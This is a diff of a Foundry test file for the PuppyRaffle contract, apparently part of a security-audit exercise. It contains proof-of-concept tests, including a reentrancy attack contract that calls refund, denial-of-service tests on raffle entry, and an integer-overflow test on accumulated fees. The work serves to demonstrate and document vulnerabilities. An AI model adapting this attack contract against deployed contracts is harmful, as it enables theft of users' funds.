@@ -4,7 +4,7 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console, console2} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
-import {SafeCast} from '@openzeppelin/contracts/utils/SafeCast.sol';
+import {SafeCast} from "@openzeppelin/contracts/utils/SafeCast.sol";
 
 contract AttackContract {
     PuppyRaffle immutable i_raffle;
@@ -12,18 +12,18 @@ contract AttackContract {
     address immutable i_player;
     uint256 index;
 
-    constructor(PuppyRaffle raffle, uint256 entranceFee) payable{
+    constructor(PuppyRaffle raffle, uint256 entranceFee) payable {
         i_raffle = raffle;
         i_entranceFee = entranceFee;
         i_player = msg.sender;
     }
 
     function attack() external {
-            address[] memory newPlayer = new address[](1);
-            newPlayer[0] = address(this);
-            i_raffle.enterRaffle{value: i_entranceFee}(newPlayer);
-            index = i_raffle.getActivePlayerIndex(address(this));
-            i_raffle.refund(index);
+        address[] memory newPlayer = new address[](1);
+        newPlayer[0] = address(this);
+        i_raffle.enterRaffle{value: i_entranceFee}(newPlayer);
+        index = i_raffle.getActivePlayerIndex(address(this));
+        i_raffle.refund(index);
     }
 
     receive() external payable {
@@ -102,21 +102,19 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
     }
 
-    //@audit-test
-    function test_Reverts_DOS_Attack_On_Unbounded_For_Loop(uint64 playersCount) external {
-        vm.assume(playersCount >= 4 && playersCount <= type(uint64).max);
-        address[] memory players = new address[](playersCount);
-        for(uint256 i = 0 ; i < playersCount; ++i){
-            players[i] = address(uint160(i));
-        }
-        puppyRaffle.enterRaffle{value: entranceFee * playersCount}(players);
-    }
+    //@audit-poc
+    // function test_Reverts_DOS_Attack_On_Unbounded_For_Loop(uint64 playersCount) external {
+    //     vm.assume(playersCount >= 4 && playersCount <= type(uint64).max);
+    //     address[] memory players = new address[](playersCount);
+    //     for (uint256 i = 0; i < playersCount; ++i) {
+    //         players[i] = address(uint160(i));
+    //     }
+    //     vm.expectRevert();
+    //     puppyRaffle.enterRaffle{value: entranceFee * playersCount}(players);
+    // }
 
-    //@audit-test
-    function test_DOS_Attack_On_EnterRaffle() external playersEntered {
-        //1. 4 players entered
-        //2. 2 players asked refunds
-        //3. No one can enter the raffle now
+    //@audit-poc
+    function test_DOS_Attack_On_EnterRaffle_Via_Refunds() external playersEntered {
         uint256 playerOneIndex = puppyRaffle.getActivePlayerIndex(playerOne);
         uint256 playerThreeIndex = puppyRaffle.getActivePlayerIndex(playerThree);
         vm.prank(playerOne);
@@ -166,9 +164,8 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.refund(indexOfPlayer);
     }
 
-    //@audit-test
+    //@audit-poc
     function test_Reentrancy_Attack_On_Refund() external playersEntered {
-
         //1. Deploy the attack contract
         AttackContract attackContract = new AttackContract{value: entranceFee}(puppyRaffle, entranceFee);
         attackContract.attack();
@@ -221,7 +218,7 @@ contract PuppyRaffleTest is Test {
         vm.expectRevert("PuppyRaffle: Need at least 4 players");
         puppyRaffle.selectWinner();
     }
-   
+
     function testSelectWinner() public playersEntered {
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
@@ -261,7 +258,7 @@ contract PuppyRaffleTest is Test {
         assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
     }
 
-    //@audit-test
+    //@audit-poc
     function test_Reverts_If_Refund_Occurs_Before_Winner() external playersEntered {
         address[] memory newPlayers = new address[](2);
         newPlayers[0] = makeAddr("player 5");
@@ -284,7 +281,7 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
     }
 
-    //@audit-test
+    //@audit-poc
     function test_Revert_When_To_Be_Winner_Takes_Out_Refund() external playersEntered {
         address[] memory newPlayers = new address[](4);
         newPlayers[0] = makeAddr("player 5");
@@ -303,27 +300,41 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
     }
 
-    //@audit-test
-    function test_Revert_On_IntegerOverflow() external {
-        address[] memory players = new address[](93);
-        for(uint256 i = 0 ; i < players.length ; i++){
-            players[i] = address(i);
+    //@audit-poc
+    function test_Revert_On_IntegerOverflow() external playersEntered{
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+        uint64 totalFeeBefore = puppyRaffle.totalFees(); //800000000000000000
+
+        address[] memory newPlayers = new address[](89);
+        for (uint256 i = 0; i < newPlayers.length; i++) {
+            newPlayers[i] = address(i);
         }
-        puppyRaffle.enterRaffle{value: entranceFee * 93}(players);
+        puppyRaffle.enterRaffle{value: entranceFee * 89}(newPlayers);
 
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
-        uint256 fee = (players.length * entranceFee * 20) / 100;
-        uint64 totalFee  = uint64(fee);
+
+        uint256 fee = (newPlayers.length * entranceFee * 20) / 100; //17800000000000000000
+
+        uint64 totalFeeAfter =  totalFeeBefore + uint64(fee);
+
+        assertGt(fee + uint256(puppyRaffle.totalFees()), type(uint64).max, "Total fee should overflow");
         puppyRaffle.selectWinner();
-        assertGt(fee, type(uint64).max, "Fee should overflow uint64");
-        assert(totalFee ==  puppyRaffle.totalFees());
-        // Verify the truncated value matches manual calculation
-        uint64 expectedTotalFee = puppyRaffle.totalFees();
-        uint64 computedFee = uint64(fee - type(uint64).max);
-        assertApproxEqAbs(uint256(computedFee),  expectedTotalFee,1);
+        assertLt(fee + uint256(puppyRaffle.totalFees()), type(uint64).max, "Total fee has overflown");
 
+        console2.log("totalFee: ", uint256(totalFeeAfter), uint256(puppyRaffle.totalFees()));
 
+       
+        assert(totalFeeAfter == puppyRaffle.totalFees());
+
+        //Verify the truncated value matches manual calculation
+        uint64 expectedTotalFee = puppyRaffle.totalFees(); //153255926290448384
+        uint64 computedFee = uint64(totalFeeBefore + uint64(fee) - type(uint64).max);
+
+        assertApproxEqAbs(uint256(computedFee), expectedTotalFee, 1);
     }
 
     //////////////////////
